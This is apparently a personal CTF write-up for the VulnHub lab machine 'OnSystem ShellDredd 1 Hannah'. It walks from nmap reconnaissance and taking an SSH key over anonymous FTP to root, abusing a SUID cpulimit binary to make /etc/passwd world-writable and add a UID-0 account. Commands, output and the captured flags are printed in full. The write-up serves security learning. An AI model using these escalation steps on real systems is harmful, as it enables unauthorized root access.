---
title: Vulnhub - OnSystem ShellDredd 1 Hannah
description: My writeup on OnSystem ShellDredd 1 Hannah box.
categories:
 - vulnhub
tags: vulnhub ssh etcpasswd cpulimit
---

![](https://i.imgur.com/LeUKXhe.png)

You can find the machine there > [OnSystem ShellDredd #1 Hannah](https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/){:target="_blank"}

## Summary

This box was a really easy one, starting off by login into FTP anonymous and grab hannah's SSH private key this will give us a low low-privilege shell. Rooting the box is a bit tricky because the cpulimit SUID doesn't allow us to spawn a root shell directly. Let's pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.7 
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 12:59 EEST
Nmap scan report for shelldredd.zte.com.cn (192.168.1.7)
Host is up (0.00016s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
61000/tcp open  unknown
MAC Address: 08:00:27:F6:95:7A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds
$ nmap -p 21,61000 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 12:59 EEST
Nmap scan report for shelldredd.zte.com.cn (192.168.1.7)
Host is up (0.00038s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
```

No web stuff interesting, let's login into FTP since we have anonymous. There we can find a SSH private key.

```
$ ftp $ip
Connected to 192.168.1.7.
220 (vsFTPd 3.0.3)
Name (192.168.1.7:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06 16:56 .
drwxr-xr-x    3 0        115          4096 Aug 06 16:56 ..
drwxr-xr-x    2 0        0            4096 Aug 06 16:54 .hannah
226 Directory send OK.
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            1823 Aug 06 16:54 id_rsa
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
226 Transfer complete.
1823 bytes received in 0.00 secs (2.0599 MB/s)
```

## Shell as hannah

Since the key is in hannah's folder, we have the username and now we can login in.

```
$ chmod 600 id_rsa 
$ ssh -i id_rsa hannah@$ip -p 61000

hannah@ShellDredd:~$ whoami;id
hannah
uid=1000(hannah) gid=1000(hannah) grupos=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

## Shell as root

Doing the classic enumeration, i found out an interesting SUID.

```
hannah@ShellDredd:~$ find / -uid 0 -perm -4000 -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd
```

I checked the [gtfobins](https://gtfobins.github.io/gtfobins/cpulimit/){:target="_blank"} page but there is no SUID option.. hm anyway i tried to execute the same command but no luck gaining a root shell.

```
hannah@ShellDredd:~$ cpulimit -l 100 -f /bin/sh
Process 667 detected
$ whoami
hannah
```

But if we run an another command like "whoami" we can get command execution as root!

```
hannah@ShellDredd:~$ cpulimit -l 100 -f whoami
Process 671 detected
root
Child process is finished, exiting...
```

So now i found a way to gain root shell, i'll make `/etc/passwd` writable and we will add a root user in! :sunglasses:

```
hannah@ShellDredd:~$ cpulimit -l 100 -f chmod o+w /etc/passwd
Process 678 detected
Child process is finished, exiting...
hannah@ShellDredd:~$ ls -la /etc/passwd
-rw-r--rw- 1 root root 1541 ago  6 16:43 /etc/passwd
```

Let's generate a password now for the user.

```
$ openssl passwd -6 -salt xyz pwned    
$6$xyz$5I4IoAWqNNcGCYvBCeIz0UZr5NoOPvvHrwR9B1AX7.1fYnHX3clTDW9YRVi3TYivXiJ8Mb8clrGt7.gTxZGXb1
```

This will be our "payload":

```
pwned:$6$xyz$5I4IoAWqNNcGCYvBCeIz0UZr5NoOPvvHrwR9B1AX7.1fYnHX3clTDW9YRVi3TYivXiJ8Mb8clrGt7.gTxZGXb1:0:0::/root:/bin/bash
```

Let's add it in & get root shell! :fire:

```
hannah@ShellDredd:~$ nano /etc/passwd
hannah@ShellDredd:~$ cat /etc/passwd | tail -1
pwned:$6$xyz$5I4IoAWqNNcGCYvBCeIz0UZr5NoOPvvHrwR9B1AX7.1fYnHX3clTDW9YRVi3TYivXiJ8Mb8clrGt7.gTxZGXb1:0:0::/root:/bin/bash
hannah@ShellDredd:~$ su - pwned
Contraseña: 
root@ShellDredd:~# whoami;id
root
uid=0(root) gid=0(root) grupos=0(root)
```

Let's read the flags:

```
root@ShellDredd:~# cat root.txt 
yeZCB44MPH2KQwbssgTQ2Nof
root@ShellDredd:~# cat /home/hannah/user.txt 
Gr3mMhbCpuwxCZorqDL3ILPn
```

Enjoyed this privesc! :smile:
